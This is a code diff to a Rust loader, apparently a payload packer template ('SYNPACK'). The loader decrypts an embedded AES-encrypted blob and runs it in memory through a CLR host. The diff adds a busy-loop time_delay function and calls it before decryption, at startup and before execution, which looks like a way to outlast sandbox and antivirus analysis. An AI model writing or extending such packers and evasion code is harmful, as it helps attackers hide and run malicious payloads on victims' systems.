@@ -10,12 +10,24 @@ fn decrypt_aes(buf: &mut Vec<u8>) {
 
     let key: [u8; 16] = [SYNPACK_KEY];
     let iv: [u8; 16]  = [SYNPACK_IV];
+    time_delay(7.0);
 
     type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 
     Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
 }
 //AES_END
+
+fn time_delay(base: f64) -> bool {
+    let mut result: f64 = 0.0;
+    let mut i: f64 = base.powf(7.0);
+
+    while i >= 0.0 {
+        result = result + i.atan() * i.tan();
+        i = i - 1.0;
+    }
+    return true;
+}
 
 //WEB_START
 async fn get_data() -> Vec<u8> {
@@ -33,6 +45,7 @@ async fn get_data() -> Vec<u8> {
 
 #[tokio::main]
 async fn main() {
+    time_delay(16.0);
 
     let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];
 
@@ -47,6 +60,7 @@ async fn main() {
     decrypt_aes(&mut bin_data);
     let mut clr: Clr = Clr::new(bin_data, args).unwrap();
 
+    time_delay(15.0);
     let result: String = clr.run().unwrap();
 
     println!("{}", result);
